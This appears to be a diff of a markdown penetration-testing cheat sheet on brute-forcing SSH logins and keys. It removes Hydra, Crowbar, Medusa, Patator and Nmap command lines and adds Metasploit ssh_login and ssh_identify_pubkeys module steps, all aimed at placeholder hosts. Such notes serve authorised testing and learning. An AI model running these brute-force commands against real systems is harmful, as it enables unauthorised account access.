@@ -1,30 +1,16 @@
-# SSH
+# Metasploit
 
-## 01 - Hydra
+TODO: Fill this info
 
-`$ hydra ssh -U`
+- Bruteforce SSH credentials
 
-`$ hydra -l <username> -P passwords.lst ssh://<IP>`
+```
+msf > use auxiliary/scanner/ssh/ssh_login
 
-TODO: Provide a syntax to bruteforce ssh keys
+msf auxiliary(scanner/ssh/ssh_login) > options
 
-`$ hydra sshkey -U`
-
-## 02 - Crowbar
-
-TODO: Provide a syntax of sshkey to brute force targets with crowbar
-
-`$ crowbar -b sshkey -s <IP>/<CIDR> -u <username> -k /path/to/id_rsa`
-
-## 03 - Medusa
-
-`$ medusa -h <IP> -u <username> -p <password> -M ssh`
-
-## 04 - Patator
-
-`$ patator ssh_login -t <int> host=<IP> port=22 user=<username> password=FILE0 0=passwords.lst -x ignore:mesg='Authentication failed.'`
-
-## 05 - Metasploit
+msf auxiliary(scanner/ssh/ssh_login) > set
+```
 
 - Bruteforce SSH Public Keys
 
@@ -52,17 +38,9 @@ Module options (auxiliary/scanner/ssh/ssh_identify_pubkeys):
 
 msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > set filename <ssh_public_key>
 
+msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > set threads 4
+
 msf auxiliary(scanner/ssh/ssh_identify_pubkeys) > run -j
-```
-
-## 05 - Nmap
-
-- Bruteforce SSH Public Keys
-
-```
-$ nmap -p 22 --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'}, ssh.privatekeys={'./id_rsa1', './id_rsa2'}" <IP>
-
-$ nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "user"}, publickeys={"./id_rsa1.pub", "./id_rsa2.pub"}' <IP>
 ```
 
 ---
